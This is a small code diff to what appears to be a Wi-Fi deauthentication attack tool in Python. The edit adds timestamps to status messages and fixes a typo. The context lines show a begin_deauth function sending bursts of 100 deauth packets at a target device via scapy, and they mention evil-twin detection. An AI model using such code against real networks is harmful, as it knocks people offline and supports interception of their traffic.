@@ -11,8 +11,10 @@ _WORKER_THREAD = None
 
 
 def _push_status(message):
+    import time
+    ts = time.strftime("[%H:%M.%S]")
     with _STATUS_LOCK:
-        _STATUS_LINES.append(str(message))
+        _STATUS_LINES.append(f"{ts} {message}")
 
 
 def begin_deauth(ap_mac, target_mac, interface):
@@ -53,7 +55,7 @@ def begin_deauth(ap_mac, target_mac, interface):
                     _push_status(f"sending 100 deauth packets..")
                     sendp(pkt, iface=interface, count=100, inter=0.1, verbose=True)
                     _push_status(f"sent 100 deauth packets")
-                    _push_status(f"No EVIL TWIN detected (deauthonly)")
+                    _push_status(f"No EVIL TWIN detected (deauth only)")
                 except Exception as e:
                     _push_status(f"send error: {str(e)}")
                     
